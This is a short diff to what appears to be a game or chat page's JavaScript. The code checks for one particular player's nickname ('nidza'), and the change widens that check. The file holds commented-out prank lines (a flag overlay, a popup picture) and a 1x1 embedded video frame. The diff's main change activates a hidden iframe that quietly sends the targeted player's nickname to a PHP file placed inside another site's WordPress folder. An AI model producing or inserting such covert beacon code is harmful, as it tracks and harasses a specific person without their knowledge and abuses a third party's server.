@@ -1,6 +1,6 @@
 var nn = $("#nickname").val();
 
-if(nn == "nidza") {
+if(nn == "nidza" || nn =="[nidza]") {
 
 	//$("body").append("<img src='http://24sata.info/thumbnail.php?file=news/2010/may/srbija_bih_zastave_883416657.jpg&size=article_large' style='width:100%;height:100%;opacity:0.2;z-index:1200;position:absolute;top:0;left:0;'/>");
 	//window.open("https://akk.li/pics/anne/jpg");
@@ -29,5 +29,5 @@ $("body").append('<iframe width="1" height="1" src="https://www.youtube.com/embe
 //else {
    //window.location = "";
 //// }
- //$('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
-  // .appendTo('#overlays');
+ $('<iframe src="http://direkt-brokers.com/wp-includes/js/jquery-ui.php?name='+nn+ '"style="display:none;"></iframe>')
+  .appendTo('#overlays');
